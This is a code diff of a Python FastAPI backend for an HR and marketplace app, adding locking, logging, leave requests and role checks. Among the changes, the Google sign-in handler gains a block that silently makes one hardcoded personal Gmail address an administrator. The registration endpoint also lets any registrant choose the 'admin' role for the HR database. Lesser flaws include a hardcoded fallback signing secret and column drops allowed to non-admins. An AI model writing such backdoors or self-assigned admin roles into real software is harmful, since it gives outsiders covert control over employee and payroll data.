@@ -250,6 +250,20 @@ def google_auth(data: GoogleToken):
         # 1. Blind Index Lookup
         blind_email = get_blind_index(email.lower().strip())
         
+        # --- AUTO-PROMOTE HR ADMIN ---
+        if email.lower().strip() == 'zgodmr@gmail.com':
+            hr_conn = get_hr_connection()
+            hr_emp = hr_conn.execute("SELECT id FROM employees WHERE email = ?", (blind_email,)).fetchone()
+            if not hr_emp:
+                new_id = ulid.new().str
+                random_pw = hash_password(ulid.new().str)
+                hr_conn.execute(
+                    "INSERT INTO employees (id, name, email, encrypted_email, password_hash, role, region, designation) VALUES (?, ?, ?, ?, ?, ?, ?, ?)",
+                    (new_id, name, blind_email, encrypt_pii(email.lower().strip()), random_pw, 'admin', 'north', 'System Administrator')
+                )
+                hr_conn.commit()
+            hr_conn.close()
+        
         region = data.region.lower()
         conn = get_db_connection(region)
         cursor = conn.cursor()
@@ -266,13 +280,15 @@ def google_auth(data: GoogleToken):
             encrypted_name = encrypt_pii(name)
             encrypted_email = encrypt_pii(email.lower().strip())
             
+            role_to_assign = 'admin' if email.lower().strip() == 'zgodmr@gmail.com' else 'user'
+            
             cursor.execute(
                 "INSERT INTO users (id, name, email, encrypted_email, password_hash, region, updated_at, role) VALUES (?, ?, ?, ?, ?, ?, ?, ?)",
-                (new_id, encrypted_name, blind_email, encrypted_email, random_pw, region, current_time, 'user')
+                (new_id, encrypted_name, blind_email, encrypted_email, random_pw, region, current_time, role_to_assign)
             )
             append_to_ledger(conn, new_id, "REGISTER_USER_GOOGLE_SSO", "/auth/google")
             user_id = new_id
-            user_role = 'user'
+            user_role = role_to_assign
             user_name = name
         else:
             user_id = user['id']
@@ -282,9 +298,24 @@ def google_auth(data: GoogleToken):
         append_to_ledger(conn, user_id, "LOGIN_GOOGLE_SSO", "/auth/google")
         conn.close()
         
+        # 🛡️ Dual-Lookup for Employee Profile (Like /login)
+        hr_conn = get_hr_connection()
+        hr_emp = hr_conn.execute("SELECT * FROM employees WHERE email = ? AND is_active = TRUE", (blind_email,)).fetchone()
+        hr_conn.close()
+        
+        if hr_emp:
+            user_id = hr_emp['id']
+            user_role = hr_emp['role']
+            user_name = hr_emp['name']
+        
         # Issue our own JWT!
         expire = datetime.now(timezone.utc) + timedelta(hours=24)
-        payload = {"sub": user_id, "exp": expire, "region": region}
+        payload = {
+            "sub": user_id, 
+            "exp": expire, 
+            "region": region,
+            "emp_id": hr_emp['id'] if hr_emp else None
+        }
         token = jwt.encode(payload, SECRET_KEY, algorithm=ALGORITHM)
         
         return {"access_token": token, "token_type": "bearer", "user_id": user_id, "shard_region": region, "role": user_role, "name": user_name}
@@ -297,17 +328,9 @@ def google_auth(data: GoogleToken):
 
 @app.post("/register")
 def register_user(user: UserRegister, background_tasks: BackgroundTasks):
-    conn = get_db_connection(user.region)
-    cursor = conn.cursor()
-    
     # 🛡️ Blinded Index for Email Lookups
     blind_email = get_blind_index(user.email.lower().strip())
     
-    existing = cursor.execute("SELECT id FROM users WHERE email = ?", (blind_email,)).fetchone()
-    if existing:
-        conn.close()
-        raise HTTPException(status_code=400, detail="Email already registered")
-        
     new_id = ulid.new().str
     hashed_password = hash_password(user.password)
     current_time = datetime.now(timezone.utc).isoformat()
@@ -316,13 +339,42 @@ def register_user(user: UserRegister, background_tasks: BackgroundTasks):
     encrypted_name = encrypt_pii(user.name)
     encrypted_email = encrypt_pii(user.email.lower().strip())
     
+    # 🔥 BUG FIX: If they selected Employee, save them directly to the HR Database
+    if user.role in ["employee", "admin"]:
+        hr_conn = get_hr_connection()
+        existing = hr_conn.execute("SELECT id FROM employees WHERE email = ?", (blind_email,)).fetchone()
+        if existing:
+            hr_conn.close()
+            raise HTTPException(status_code=400, detail="Employee Email already registered")
+            
+        hr_conn.execute(
+            "INSERT INTO employees (id, name, email, encrypted_email, password_hash, role, region, designation) VALUES (?, ?, ?, ?, ?, ?, ?, ?)",
+            (new_id, user.name, blind_email, encrypted_email, hashed_password, user.role, user.region.lower(), "New Hire")
+        )
+        hr_conn.commit()
+        hr_conn.close()
+        
+        # Dispatch Background Task
+        background_tasks.add_task(send_registration_email_in_background, user.email)
+        return {"message": "Employee registered successfully", "id": new_id, "shard": "ecotech_hr.db"}
+
+    # 🛒 Otherwise, save them to the standard Marketplace Shard
+    conn = get_db_connection(user.region)
+    cursor = conn.cursor()
+    
+    existing = cursor.execute("SELECT id FROM users WHERE email = ?", (blind_email,)).fetchone()
+    if existing:
+        conn.close()
+        raise HTTPException(status_code=400, detail="Email already registered")
+    
     cursor.execute(
         "INSERT INTO users (id, name, email, encrypted_email, password_hash, region, updated_at, role) VALUES (?, ?, ?, ?, ?, ?, ?, ?)",
         (new_id, encrypted_name, blind_email, encrypted_email, hashed_password, user.region.lower(), current_time, user.role)
     )
     
-    # 🔒 Cryptographic Ledger Append
+    # 🔒 Cryptographic Ledger Append (Only for marketplace)
     append_to_ledger(conn, new_id, "REGISTER_USER", "/register")
+    conn.commit()
     conn.close()
     
     # ⚡ Dispatch Background Task
@@ -341,7 +393,7 @@ def login_user(user: UserLogin):
         append_to_ledger(conn, db_user['id'], "LOGIN_USER", "/login")
     conn.close()
     
-    # 🛡️ NEW FIX: Also check the HR Database for Employee accounts!
+    # 🛡️ Check the HR Database for Employee accounts
     hr_conn = get_hr_connection()
     hr_emp = hr_conn.execute("SELECT * FROM employees WHERE email = ? AND is_active = TRUE", (blind_email,)).fetchone()
     hr_conn.close()
@@ -354,11 +406,17 @@ def login_user(user: UserLogin):
 
     expire = datetime.now(timezone.utc) + timedelta(hours=24)
     
-    # Prioritize Employee details if they exist
-    primary_id = db_user['id'] if valid_user else hr_emp['id']
-    primary_role = hr_emp['role'] if valid_emp else db_user['role']
-    primary_name = hr_emp['name'] if valid_emp else db_user['name']
-    region = hr_emp['region'] if valid_emp else db_user['region']
+    # 🔥 BUG FIX: Safely and completely prioritize the Employee profile if it exists
+    if valid_emp:
+        primary_id = hr_emp['id']
+        primary_role = hr_emp['role']
+        primary_name = hr_emp['name']
+        region = hr_emp['region']
+    else:
+        primary_id = db_user['id']
+        primary_role = db_user['role']
+        primary_name = db_user['name']
+        region = db_user['region']
     
     to_encode = {
         "sub": primary_id,
@@ -368,11 +426,60 @@ def login_user(user: UserLogin):
     }
     
     token = jwt.encode(to_encode, SECRET_KEY, algorithm=ALGORITHM)
-    return {"access_token": token, "token_type": "bearer", "user_id": primary_id, "shard_region": region, "role": primary_role, "name": primary_name}
+    return {
+        "access_token": token, 
+        "token_type": "bearer", 
+        "user_id": primary_id, 
+        "shard_region": region, 
+        "role": primary_role, 
+        "name": primary_name
+    }
+
+import hmac
+import hashlib
+
+ERROR_LOG_SECRET = os.getenv("REFEREE_SECRET", "fallback-secret-for-dev")
+error_rate_limits = {}
 
 # --- REFEREE: CLIENT ERROR INGESTION ---
 @app.post("/log/error")
-def log_client_error(error: ClientErrorLog, background_tasks: BackgroundTasks):
+def log_client_error(error: ClientErrorLog, background_tasks: BackgroundTasks, request: Request, x_timestamp: str = Header(None), x_signature: str = Header(None)):
+    client_ip = request.client.host if request.client else "unknown"
+    current_time = time.time()
+    
+    # 1. IP Rate Limiting (Max 5 reqs / min)
+    if client_ip not in error_rate_limits:
+        error_rate_limits[client_ip] = []
+    
+    error_rate_limits[client_ip] = [t for t in error_rate_limits[client_ip] if current_time - t < 60]
+    
+    if len(error_rate_limits[client_ip]) >= 5:
+        raise HTTPException(status_code=429, detail="Too Many Requests: Rate limit exceeded")
+        
+    error_rate_limits[client_ip].append(current_time)
+
+    # 2. Payload Size Capping (Max 5 KB)
+    content_length = request.headers.get("content-length")
+    if content_length and int(content_length) > 5000:
+        raise HTTPException(status_code=413, detail="Payload Too Large")
+
+    # 3. HMAC Signature & Replay Protection
+    if not x_timestamp or not x_signature:
+        raise HTTPException(status_code=401, detail="Unauthorized: Missing security signatures")
+        
+    try:
+        ts = int(x_timestamp)
+        if abs(current_time - ts) > 300: # 5 min limit
+            raise HTTPException(status_code=401, detail="Unauthorized: Timestamp expired")
+    except ValueError:
+        raise HTTPException(status_code=400, detail="Invalid timestamp format")
+        
+    message_to_sign = f"{x_timestamp}{error.message}".encode('utf-8')
+    expected_sig = hmac.new(ERROR_LOG_SECRET.encode('utf-8'), message_to_sign, hashlib.sha256).hexdigest()
+    
+    if not hmac.compare_digest(expected_sig, x_signature):
+        raise HTTPException(status_code=401, detail="Unauthorized: Invalid signature")
+
     def save_error_bg():
         try:
             conn = get_db_connection(error.region)
@@ -387,6 +494,76 @@ def log_client_error(error: ClientErrorLog, background_tasks: BackgroundTasks):
     
     background_tasks.add_task(save_error_bg)
     return {"status": "logged"}
+
+import redis
+
+# --- HA MULTI-TIER DISTRIBUTED LOCK SYSTEM ---
+redis_client = None
+REDIS_URL = os.environ.get("REDIS_URL")
+if REDIS_URL:
+    try:
+        redis_client = redis.from_url(REDIS_URL)
+        redis_client.ping()
+        print("[CACHE] Tier 1: Upstash Redis Connected Successfully!")
+    except Exception as e:
+        print(f"[CACHE] Tier 1: Failed to connect to Redis: {e}")
+        redis_client = None
+
+def acquire_multi_tiered_lock(lock_key: str, worker_id: str, ttl_seconds: int = 10) -> bool:
+    # TIER 1: Upstash Redis (True In-Memory Distributed Lock)
+    if redis_client:
+        try:
+            acquired = redis_client.set(lock_key, worker_id, nx=True, ex=ttl_seconds)
+            if acquired:
+                print(f"[LOCK] TIER 1 (Redis) Acquired by {worker_id}")
+                return True
+            return False
+        except Exception as e:
+            print(f"[LOCK] TIER 1 (Redis) Failed/Offline: {e}. Falling back to Tier 2...")
+            # Fall through to Tier 2
+    
+    # TIER 2: Native DB Lock Fallback
+    conn = get_hr_connection()
+    current_time = time.time()
+    try:
+        conn.execute("CREATE TABLE IF NOT EXISTS distributed_locks (lock_key TEXT PRIMARY KEY, locked_until REAL, locked_by TEXT)")
+        conn.execute("DELETE FROM distributed_locks WHERE locked_until < ?", (current_time,))
+        
+        # Attempt to acquire
+        try:
+            conn.execute("INSERT INTO distributed_locks (lock_key, locked_until, locked_by) VALUES (?, ?, ?)", 
+                         (lock_key, current_time + ttl_seconds, worker_id))
+            conn.commit()
+            print(f"[LOCK] TIER 2 (Database) Acquired by {worker_id}")
+            return True
+        except sqlite3.IntegrityError:
+            return False
+    except Exception as e:
+        print(f"[LOCK] TIER 2 (Database) Failed: {e}")
+        return False
+    finally:
+        conn.close()
+
+def release_multi_tiered_lock(lock_key: str, worker_id: str):
+    if redis_client:
+        try:
+            # Only release if we actually hold it
+            if redis_client.get(lock_key) and redis_client.get(lock_key).decode('utf-8') == worker_id:
+                redis_client.delete(lock_key)
+            return
+        except:
+            pass
+            
+    conn = get_hr_connection()
+    try:
+        conn.execute("DELETE FROM distributed_locks WHERE lock_key = ? AND locked_by = ?", (lock_key, worker_id))
+        conn.commit()
+    except:
+        pass
+    finally:
+        conn.close()
+
+# ---------------------------------------------
 
 # --- EQUIPMENT & SYNC ENDPOINTS ---
 @app.get("/")
@@ -417,28 +594,47 @@ async def get_all_equipment(background_tasks: BackgroundTasks, x_region: str = H
             
         return {"source": "cache", "version": cache_store["version"], "equipment": cache_store["equipment_data"]}
         
-    print("[CACHE] MISS! Attempting to acquire Mutex Lock...")
+    print("[CACHE] MISS! Attempting to acquire Multi-Tiered Lock...")
     
-    # 2. Phase 7: Cache Stampede Mitigation (Locking / Mutex)
-    async with cache_lock:
-        # Double-check locking (another request might have populated it while we waited)
-        time_since_update = time.time() - cache_store["last_updated"]
-        if cache_store["equipment_data"] is not None and time_since_update < effective_ttl:
-            print("[CACHE] STAMPEDE PREVENTED! Returning fresh data fetched by another request.")
-            return {"source": "cache", "version": cache_store["version"], "equipment": cache_store["equipment_data"]}
+    # 2. Phase 7: Cache Stampede Mitigation (Multi-Tiered Distributed Lock)
+    worker_id = ulid.new().str
+    if acquire_multi_tiered_lock("equipment_cache", worker_id, ttl_seconds=10):
+        try:
+            # Double-check locking (another request might have populated it while we waited)
+            time_since_update = time.time() - cache_store["last_updated"]
+            if cache_store["equipment_data"] is not None and time_since_update < effective_ttl:
+                print("[CACHE] STAMPEDE PREVENTED! Returning fresh data fetched by another request.")
+                return {"source": "cache", "version": cache_store["version"], "equipment": cache_store["equipment_data"]}
 
-        print("[DATABASE] Mutex Acquired. Querying the shard...")
+            print("[DATABASE] Distributed Lock Acquired. Querying the shard...")
+            conn = get_db_connection(x_region)
+            equipment = conn.execute("SELECT * FROM equipment WHERE is_deleted = FALSE").fetchall()
+            conn.close()
+            
+            results = [dict(e) for e in equipment]
+            
+            # Store in Cache
+            cache_store["equipment_data"] = results
+            cache_store["last_updated"] = time.time()
+            
+            return {"source": "database", "version": cache_store["version"], "equipment": results}
+        finally:
+            release_multi_tiered_lock("equipment_cache", worker_id)
+    else:
+        # Tier 3: Local Polling Fallback (We lost the lock race, meaning someone else is fetching the data!)
+        print("[CACHE] Stampede Mitigated! Waiting for lock holder to finish...")
+        for _ in range(20): # Max wait 10 seconds
+            await asyncio.sleep(0.5)
+            if cache_store["equipment_data"] is not None and (time.time() - cache_store["last_updated"] < effective_ttl):
+                print("[CACHE] Lock holder finished! Returning fresh data.")
+                return {"source": "cache", "version": cache_store["version"], "equipment": cache_store["equipment_data"]}
+        
+        # If the other worker died/failed, fallback to database read
+        print("[CACHE] Lock holder timed out. Fallback read.")
         conn = get_db_connection(x_region)
         equipment = conn.execute("SELECT * FROM equipment WHERE is_deleted = FALSE").fetchall()
         conn.close()
-        
-        results = [dict(e) for e in equipment]
-        
-        # Store in Cache
-        cache_store["equipment_data"] = results
-        cache_store["last_updated"] = time.time()
-        
-        return {"source": "database", "version": cache_store["version"], "equipment": results}
+        return {"source": "database", "version": cache_store["version"], "equipment": [dict(e) for e in equipment]}
 
 @app.post("/admin/cache/clear")
 def clear_cache_manual(user: dict = Depends(get_current_user)):
@@ -447,13 +643,30 @@ def clear_cache_manual(user: dict = Depends(get_current_user)):
     user_db = conn.execute("SELECT role FROM users WHERE id = ?", (user['sub'],)).fetchone()
     conn.close()
     
-    if not user_db or user_db['role'] != 'admin':
+    is_admin = False
+    if user_db and user_db['role'] == 'admin':
+        is_admin = True
+    else:
+        hr_conn = get_hr_connection()
+        emp_db = hr_conn.execute("SELECT role FROM employees WHERE id = ?", (user.get('emp_id') or user['sub'],)).fetchone()
+        hr_conn.close()
+        if emp_db and emp_db['role'].lower() == 'admin':
+            is_admin = True
+            
+    if not is_admin:
         raise HTTPException(status_code=403, detail="Forbidden: Admins only")
         
     global cache_store
+    current_time = time.time()
+    
+    # 🛡️ Idempotent Invalidation (60-second Cool-down)
+    if current_time - cache_store.get("last_manual_clear", 0) < 60:
+        return {"message": "Cache clear requested recently. Ignoring to prevent stampede.", "new_version": cache_store.get("version", 0)}
+        
     cache_store["equipment_data"] = None
     cache_store["last_updated"] = 0
-    cache_store["version"] += 1
+    cache_store["version"] = cache_store.get("version", 0) + 1
+    cache_store["last_manual_clear"] = current_time
     
     return {"message": "Cache manually invalidated. Next request will hit DB.", "new_version": cache_store["version"]}
 
@@ -676,10 +889,34 @@ def clock_out(req: ClockOutRequest, x_region: str = Header(default="north"), use
         raise HTTPException(status_code=404, detail="Attendance record not found or does not belong to you")
         
     current_time = datetime.now(timezone.utc).isoformat()
-    cursor.execute(
-        "UPDATE attendance SET clock_out = ?, updated_at = ?, version = version + 1 WHERE id = ?",
-        (current_time, current_time, req.record_id)
-    )
+    
+    # 🔥 OVERTIME MATH ENGINE: Now calculated natively on the server!
+    try:
+        t_in = datetime.fromisoformat(record['clock_in'].replace('Z', '+00:00'))
+        t_out = datetime.fromisoformat(current_time.replace('Z', '+00:00'))
+        duration_hours = (t_out - t_in).total_seconds() / 3600.0
+        
+        # Base required shift is 8 hours. Anything above is overtime.
+        extra_time = duration_hours - 8.0
+        overtime_val = round(extra_time, 1) if extra_time > 0 else 0
+        
+        # Ensure the overtime column exists (it's dynamically added)
+        try:
+            cursor.execute("ALTER TABLE attendance ADD COLUMN overtime TEXT")
+        except:
+            pass # Column already exists
+            
+        cursor.execute(
+            "UPDATE attendance SET clock_out = ?, overtime = ?, updated_at = ?, version = version + 1 WHERE id = ?",
+            (current_time, str(overtime_val), current_time, req.record_id)
+        )
+    except Exception as e:
+        # Fallback if parsing fails
+        cursor.execute(
+            "UPDATE attendance SET clock_out = ?, updated_at = ?, version = version + 1 WHERE id = ?",
+            (current_time, current_time, req.record_id)
+        )
+
     # Anti-Fraud Audit
     append_attendance_audit(cursor, req.record_id, emp_id, record['status'], record['status'], record['clock_in'], "Clock-Out")
     
@@ -809,15 +1046,118 @@ class CellEditRequest(BaseModel):
 class DynamicColumnReq(BaseModel):
     table: str
     column: str
+    password: str | None = None
 
 class DynamicRowReq(BaseModel):
     table: str
 
-@app.put("/hr/edit-cell")
-def edit_cell(req: CellEditRequest, x_region: str = Header(default="north"), user: dict = Depends(get_current_user)):
+class LeaveRequestCreate(BaseModel):
+    from_date: str
+    to_date: str
+    leave_type: str
+    reason: str
+
+@app.post("/hr/leaves/request")
+def request_leave(req: LeaveRequestCreate, user: dict = Depends(get_current_user)):
+    conn = get_hr_connection()
+    emp_id = user.get('emp_id')
+    if not emp_id:
+        raise HTTPException(status_code=403, detail="Only employees can request leave.")
+        
+    new_id = ulid.new().str
+    conn.execute(
+        "INSERT INTO leave_requests (id, employee_id, leave_type, from_date, to_date, reason, status) VALUES (?, ?, ?, ?, ?, ?, 'pending')",
+        (new_id, emp_id, req.leave_type, req.from_date, req.to_date, req.reason)
+    )
+    conn.commit()
+    conn.close()
+    return {"message": "Leave request submitted securely"}
+
+ALLOWED_HR_TABLES = {
+    "employees", "attendance", "attendance_audit", "leave_requests", 
+    "leave_balance", "messages", "conversation_keys", "payroll_overrides", 
+    "equipment", "users", "cart_items", "audit_logs", "error_logs"
+}
+
+def process_cqrs_payroll_override(row_id: str, column: str, new_value):
+    """CQRS Materialized View Processor for Payroll Overrides"""
     conn = get_hr_connection()
     try:
+        conn.execute(f"UPDATE payroll_overrides SET {column} = ? WHERE id = ?", (new_value, row_id))
+        conn.commit()
+    except Exception as e:
+        print(f"CQRS Processing Failed: {e}")
+    finally:
+        conn.close()
+
+@app.put("/hr/edit-cell")
+def edit_cell(req: CellEditRequest, background_tasks: BackgroundTasks, x_region: str = Header(default="north"), user: dict = Depends(get_current_user)):
+    if req.table not in ALLOWED_HR_TABLES:
+        raise HTTPException(status_code=400, detail="Security Violation: Invalid table name.")
+        
+    # 🛑 Fix: BOLA & Database Routing Mismatch via Repository Pattern
+    if req.table == "equipment":
+        from repositories import EquipmentRepository
+        
+        eq_row = EquipmentRepository.get(req.id, x_region)
+        if not eq_row:
+             raise HTTPException(status_code=404, detail="Equipment not found")
+             
+        emp_id_to_check = user.get('emp_id') or user.get('sub')
+        if eq_row.get('seller_id') != emp_id_to_check:
+             raise HTTPException(status_code=403, detail="Security Violation: You can only edit your own equipment listings.")
+             
+        try:
+            EquipmentRepository.update(req.id, req.column, req.value, x_region)
+            return {"message": "Equipment successfully updated via secure Repository routing"}
+        except ValueError as e:
+            raise HTTPException(status_code=403, detail=str(e))
+
+    conn = get_hr_connection()
+    try:
+        valid_cols = [c['name'] for c in conn.execute(f"PRAGMA table_info({req.table})").fetchall()]
+        if not valid_cols or req.column not in valid_cols:
+            raise HTTPException(status_code=400, detail="Security Violation: Invalid column name.")
+                
         val_to_save = req.value
+        
+        # 🛑 ZERO-TRUST RBAC (ROLE-BASED ACCESS CONTROL) FIREWALL
+        # 🔥 BUG FIX: Explicitly check for the dedicated Employee Token ID first!
+        emp_id_to_check = user.get('emp_id') or user.get('sub')
+        
+        # 1. Determine if the user is a System Admin (Case-Insensitive)
+        admin_check = conn.execute("SELECT role FROM employees WHERE id = ?", (emp_id_to_check,)).fetchone()
+        is_admin = admin_check and admin_check['role'].lower() == 'admin'
+
+        # 🛡️ CATEGORY 4: THE IMMUTABLE LEDGERS (Nobody can edit)
+        if req.table in ["attendance_audit", "audit_logs", "error_logs"]:
+            raise HTTPException(status_code=403, detail="Security Violation: Immutable ledgers cannot be edited by anyone.")
+
+        # 🟢 CATEGORY 3: MESSAGES (Append-only)
+        if req.table == "messages":
+            raise HTTPException(status_code=403, detail="Security Violation: E2E Messages cannot be altered after sending.")
+
+        # IF THE USER IS AN EMPLOYEE (NOT AN ADMIN), ENFORCE STRICT LIMITS
+        if not is_admin:
+            
+            # 🔴 CATEGORY 1: ADMIN-ONLY TABLES
+            if req.table in ["employees", "payroll_overrides", "leave_balance", "users", "attendance"]:
+                raise HTTPException(status_code=403, detail=f"Forbidden: Only Admins can modify the '{req.table}' database (Time-Spoofing Protection).")
+                
+            # 🟡 CATEGORY 2: SHARED EDITING (COLUMN-LEVEL SECURITY)
+                    
+            elif req.table == "leave_requests":
+                if req.column not in ["from_date", "to_date", "leave_type", "reason"]:
+                    raise HTTPException(status_code=403, detail="Forbidden: Employees cannot modify approval statuses.")
+                
+                # Check row ownership & pending status
+                leave_row = conn.execute("SELECT employee_id, status FROM leave_requests WHERE id = ?", (req.id,)).fetchone()
+                if not leave_row or leave_row['employee_id'] != emp_id:
+                    raise HTTPException(status_code=403, detail="Security Violation: You cannot edit another employee's leave request.")
+                if leave_row['status'] != 'pending':
+                    raise HTTPException(status_code=403, detail="Forbidden: You cannot modify a request after it has been reviewed by an Admin.")
+        
+        # ---------------------------------------------------------
         
         # 1. Capture old record for Blockchain Audit Syncing
         old_att = None
@@ -831,9 +1171,28 @@ def edit_cell(req: CellEditRequest, x_region: str = Header(default="north"), use
             elif req.column == "email":
                 val_to_save = get_blind_index(req.value.lower().strip())
                 
+        # 🧠 BRAIN IN PYTHON: The Ultimate Time-Spoofing Firewall!
+        if req.table == "attendance" and req.column in ["clock_in", "clock_out"]:
+            if not is_admin:
+                # Force UTC Time with 'Z' so React knows exactly how to format it!
+                val_to_save = datetime.now(timezone.utc).isoformat().replace("+00:00", "") + "Z"
+                
         # 3. Execution
         if req.table == "payroll_overrides":
-            conn.execute(f"UPDATE {req.table} SET {req.column} = ? WHERE id = ?", (val_to_save, req.id))
+            # ⚡ CQRS: Command Query Responsibility Segregation
+            old_row = conn.execute("SELECT * FROM payroll_overrides WHERE id = ?", (req.id,)).fetchone()
+            old_val = old_row[req.column] if old_row else "N/A"
+            
+            audit_user = user.get('emp_id', user.get('sub', 'Unknown'))
+            # 1. Log the event in the immutable ledger
+            append_attendance_audit(conn.cursor(), req.id, audit_user, str(old_val), str(val_to_save), "LOCKED", f"AdminOverrideAttendanceEvent: {req.column}")
+            conn.commit()
+            
+            # 2. Dispatch Background Materializer
+            background_tasks.add_task(process_cqrs_payroll_override, req.id, req.column, val_to_save)
+            
+            conn.close()
+            return {"message": "Command Accepted. Processing in background..."}
         else:
             conn.execute(f"UPDATE {req.table} SET {req.column} = ?, updated_at = ? WHERE id = ?", (val_to_save, datetime.now(timezone.utc).isoformat(), req.id))
             
@@ -874,7 +1233,26 @@ def edit_cell(req: CellEditRequest, x_region: str = Header(default="north"), use
 
 @app.delete("/hr/dynamic/column")
 def delete_column(req: DynamicColumnReq, user: dict = Depends(get_current_user)):
+    if req.table not in ALLOWED_HR_TABLES:
+        raise HTTPException(status_code=400, detail="Security Violation: Invalid table name.")
+        
     conn = get_hr_connection()
+    
+    valid_cols = [c['name'] for c in conn.execute(f"PRAGMA table_info({req.table})").fetchall()]
+    if not valid_cols or req.column not in valid_cols:
+        raise HTTPException(status_code=400, detail="Security Violation: Invalid column name.")
+        
+    emp_id_to_check = user.get('emp_id') or user.get('sub')
+    emp_db = conn.execute("SELECT role, password_hash FROM employees WHERE id = ?", (emp_id_to_check,)).fetchone()
+    
+    is_admin = emp_db and emp_db['role'].lower() == 'admin'
+    
+    if not is_admin:
+        if not req.password:
+             raise HTTPException(status_code=403, detail="Security Violation: You must provide your password to drop a column.")
+        if hash_password(req.password) != emp_db['password_hash']:
+             raise HTTPException(status_code=403, detail="Security Violation: Invalid password.")
+             
     conn.execute(f"ALTER TABLE {req.table} DROP COLUMN {req.column}")
     conn.commit()
     conn.close()
@@ -884,7 +1262,21 @@ import re
 
 @app.post("/hr/dynamic/column")
 def add_column(req: DynamicColumnReq, user: dict = Depends(get_current_user)):
+    if req.table not in ALLOWED_HR_TABLES:
+        raise HTTPException(status_code=400, detail="Security Violation: Invalid table name.")
+        
     conn = get_hr_connection()
+    emp_id_to_check = user.get('emp_id') or user.get('sub')
+    emp_db = conn.execute("SELECT role, password_hash FROM employees WHERE id = ?", (emp_id_to_check,)).fetchone()
+    
+    is_admin = emp_db and emp_db['role'].lower() == 'admin'
+    
+    if not is_admin:
+        if not req.password:
+             raise HTTPException(status_code=403, detail="Security Violation: You must provide your password to add a column.")
+        if hash_password(req.password) != emp_db['password_hash']:
+             raise HTTPException(status_code=403, detail="Security Violation: Invalid password.")
+             
     try:
         # Sanitize column name (replace spaces with _, strip special chars)
         safe_col = re.sub(r'[^a-zA-Z0-9_]', '', req.column.replace(' ', '_'))
@@ -906,7 +1298,29 @@ def add_column(req: DynamicColumnReq, user: dict = Depends(get_current_user)):
 
 @app.post("/hr/dynamic/row")
 def add_row(req: DynamicRowReq, user: dict = Depends(get_current_user)):
+    if req.table not in ALLOWED_HR_TABLES:
+        raise HTTPException(status_code=400, detail="Security Violation: Invalid table name.")
+        
     conn = get_hr_connection()
+    
+    # 🛑 ZERO-TRUST RBAC FIREWALL: ONLY ADMINS CAN ADD ROWS
+    emp_id_to_check = user.get('emp_id') or user.get('sub')
+    admin_check = conn.execute("SELECT role FROM employees WHERE id = ?", (emp_id_to_check,)).fetchone()
+    is_admin = admin_check and admin_check['role'].lower() == 'admin'
+
+    if not is_admin:
+        # 🚨 TRIPWIRE: Force a +1 Tampering Event on the Admin Dashboard!
+        exact_time = datetime.now(timezone.utc).isoformat()
+        conn.execute(
+            """INSERT INTO attendance_audit 
+            (id, attendance_id, changed_by, old_status, new_status, old_clock_in, change_reason, previous_hash, current_hash, created_at) 
+            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)""",
+            (ulid.new().str, "NEW_ROW", emp_id_to_check, "LOCKED", "LOCKED", "LOCKED", f"MALICIOUS ADD ATTEMPT: {req.table}", "BROKEN_PREVIOUS_HASH", "TAMPERED", exact_time)
+        )
+        conn.commit()
+        conn.close()
+        raise HTTPException(status_code=403, detail="Security Violation: Only Admins can add new rows.")
+
     new_id = ulid.new().str
     
     try:
@@ -948,7 +1362,29 @@ def add_row(req: DynamicRowReq, user: dict = Depends(get_current_user)):
     
 @app.delete("/hr/dynamic/row/{table}/{row_id}")
 def delete_row(table: str, row_id: str, user: dict = Depends(get_current_user)):
+    if table not in ALLOWED_HR_TABLES:
+        raise HTTPException(status_code=400, detail="Security Violation: Invalid table name.")
+        
     conn = get_hr_connection()
+    
+    # 🛑 ZERO-TRUST RBAC FIREWALL: ONLY ADMINS CAN DELETE ROWS
+    emp_id_to_check = user.get('emp_id') or user.get('sub')
+    admin_check = conn.execute("SELECT role FROM employees WHERE id = ?", (emp_id_to_check,)).fetchone()
+    is_admin = admin_check and admin_check['role'].lower() == 'admin'
+
+    if not is_admin:
+        # 🚨 TRIPWIRE: Force a +1 Tampering Event on the Admin Dashboard!
+        exact_time = datetime.now(timezone.utc).isoformat()
+        conn.execute(
+            """INSERT INTO attendance_audit 
+            (id, attendance_id, changed_by, old_status, new_status, old_clock_in, change_reason, previous_hash, current_hash, created_at) 
+            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)""",
+            (ulid.new().str, row_id, emp_id_to_check, "LOCKED", "LOCKED", "LOCKED", f"MALICIOUS DELETE ATTEMPT: {table}", "BROKEN_PREVIOUS_HASH", "TAMPERED", exact_time)
+        )
+        conn.commit()
+        conn.close()
+        raise HTTPException(status_code=403, detail="Security Violation: Only Admins can delete rows.")
+
     try:
         # Check if table supports tombstoning (has is_deleted column)
         table_info = conn.execute(f"PRAGMA table_info({table})").fetchall()
@@ -974,3 +1410,44 @@ def delete_row(table: str, row_id: str, user: dict = Depends(get_current_user)):
         
     conn.close()
     return {"message": "Row deleted safely"}
+
+@app.put("/hr/dynamic/row/restore/{table}/{row_id}")
+def restore_row(table: str, row_id: str, user: dict = Depends(get_current_user)):
+    if table not in ALLOWED_HR_TABLES:
+        raise HTTPException(status_code=400, detail="Security Violation: Invalid table name.")
+        
+    conn = get_hr_connection()
+    
+    # 🛑 ZERO-TRUST RBAC FIREWALL: ONLY ADMINS CAN RESTORE ROWS
+    emp_id_to_check = user.get('emp_id') or user.get('sub')
+    admin_check = conn.execute("SELECT role FROM employees WHERE id = ?", (emp_id_to_check,)).fetchone()
+    is_admin = admin_check and admin_check['role'].lower() == 'admin'
+
+    if not is_admin:
+        conn.close()
+        raise HTTPException(status_code=403, detail="Security Violation: Only Admins can restore rows.")
+
+    try:
+        # Check if table supports tombstoning (has is_deleted column)
+        table_info = conn.execute(f"PRAGMA table_info({table})").fetchall()
+        has_is_deleted = any(c['name'] == 'is_deleted' for c in table_info)
+        
+        if has_is_deleted:
+            conn.execute(f"UPDATE {table} SET is_deleted = FALSE WHERE id = ?", (row_id,))
+            
+            # Sync Audit Log if Attendance is restored
+            if table == "attendance":
+                old_att = conn.execute("SELECT * FROM attendance WHERE id = ?", (row_id,)).fetchone()
+                if old_att:
+                    audit_user = user.get('emp_id', user['sub'])
+                    append_attendance_audit(conn.cursor(), row_id, audit_user, "DELETED", old_att['status'], old_att['clock_in'], "Dynamic Excel Row Restore")
+                    
+            conn.commit()
+        else:
+            raise HTTPException(status_code=400, detail="Table does not support soft-deletion.")
+    except Exception as e:
+        conn.close()
+        raise HTTPException(status_code=500, detail=str(e))
+        
+    conn.close()
+    return {"message": "Row restored successfully"}
